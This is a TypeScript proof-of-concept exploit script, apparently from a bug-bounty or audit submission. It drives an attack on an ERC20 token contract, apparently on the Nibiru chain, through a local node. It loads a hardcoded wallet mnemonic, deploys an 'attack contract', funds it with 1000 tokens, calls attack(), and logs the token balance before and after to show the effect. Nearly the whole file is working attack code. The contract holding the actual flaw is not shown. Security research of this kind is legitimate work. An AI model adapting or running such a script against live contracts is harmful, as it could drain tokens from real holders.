import { Contract, formatUnits, HDNodeWallet, JsonRpcProvider, parseUnits } from "ethers";
import { POC24__factory } from "../../typechain-types";

// connects to local node
const jsonRpcProvider = new JsonRpcProvider("http://localhost:8545");

// mnemonic for the HD wallet
const mnemonic = "guard cream sadness conduct invite crumble clock pudding hole grit liar hotel maid produce squeeze return argue turtle know drive eight casino maze host"
const owner = HDNodeWallet.fromPhrase(mnemonic, "", "m/44'/118'/0'/0/0").connect(jsonRpcProvider)

const ERC20_ADDRESS = process.argv[2];
const RECIPIENT_ADDRESS = process.argv[3];

const erc20Abi = [
  "function transfer(address recipient, uint256 amount) external returns (bool)",
  "function balanceOf(address _owner) public view returns (uint256 balance)"
];

async function main() {
  console.log("ERC20_ADDRESS: ", ERC20_ADDRESS);
  console.log("RECIPIENT_ADDRESS: ", RECIPIENT_ADDRESS);
  const nibi_erc20 = new Contract(ERC20_ADDRESS, erc20Abi, owner);

  const balance = await nibi_erc20.balanceOf(owner);
  console.log(`ERC20 Balance of owner before transaction: ${formatUnits(balance, 6)}`);

  // deploy contract
  console.log("deploying attack contract")
  const factory = new POC24__factory(owner);
  const attackContract = await factory.deploy(ERC20_ADDRESS, RECIPIENT_ADDRESS);
  await attackContract.waitForDeployment();

  console.log("attack contract address: ", await attackContract.getAddress())

  // transfer the amount to contract
  console.log("transferring 1000 tokens to attack contract")
  const tx = await nibi_erc20.transfer(attackContract, parseUnits("1000", 6));
  await tx.wait();
  console.log("transfer complete")

  // show end balance
  const balanceBefore = await nibi_erc20.balanceOf(attackContract);
  console.log(`ERC20 Balance of contract before attack begins: ${formatUnits(balanceBefore, 6)}`);

  // call attack
  console.log("calling attack")
  const tx2 = await attackContract.attack({gasLimit: 1_000_000});
  // get transaction receipt
  const receipt = await tx2.wait();
  console.log("Transaction receipt:", receipt);

  // show end balance
  const balanceAfter = await nibi_erc20.balanceOf(attackContract);
  console.log(`ERC20 Balance of contract after attack: ${formatUnits(balanceAfter, 6)}`);
}

main();